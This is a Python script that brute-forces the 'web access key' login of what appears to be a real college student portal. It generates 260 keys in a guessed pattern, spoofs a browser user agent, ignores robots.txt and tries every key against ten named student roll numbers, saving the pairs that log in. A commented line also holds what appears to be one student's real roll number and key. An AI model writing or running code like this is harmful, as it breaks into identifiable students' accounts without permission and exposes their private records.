import mechanize
from bs4 import BeautifulSoup
import itertools

def generate_combinations():
    capital_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    numbers = '0123456789'
    
    combinations = []
    
    # Generate the combinations with the given format
    for letter2 in numbers:
        for letter3 in capital_letters:
            combination = '#' + 'Q'*2 + letter2 + letter3
            combinations.append(combination)
    
    return combinations

# Generate and print all combinations
combinations = generate_combinations()
print(len(combinations))
# Create a mechanize browser object
browser = mechanize.Browser()
browser.set_handle_robots(False)
cookies = mechanize.CookieJar()
browser.set_cookiejar(cookies)
browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
browser.set_handle_refresh(False)
# Login

# data={'20881A05B1':'#NN5A'}
# numb=input("enter last 2 digits:")
# numb='20881A05'+numb
# if(numb not in data):
#     pas=input("enter password:")
#     data[numb]=pas
rollno=[]
for i in range(10):
    rollno.append('20881A05B'+str(i))
data={}
for i in combinations:
    for j in rollno:
        login_url = 'https://studentscorner.vardhaman.org/student_corner_index.php'
        browser.open(login_url)
        browser.select_form(nr=0)
        browser.form['rollno'] = j
        browser.form['wak'] = i
        response = browser.submit()
        soup = BeautifulSoup(response, 'html.parser')
        # Find the fifth table
        table = soup.find('font')
        print(str(table.text)[0],j,i)
        if(table.text == 'Invalid Web Access Key ' or str(table.text)[0]=='C'):
            continue
        data[j]=i
        print(j,i)
        break
print(data)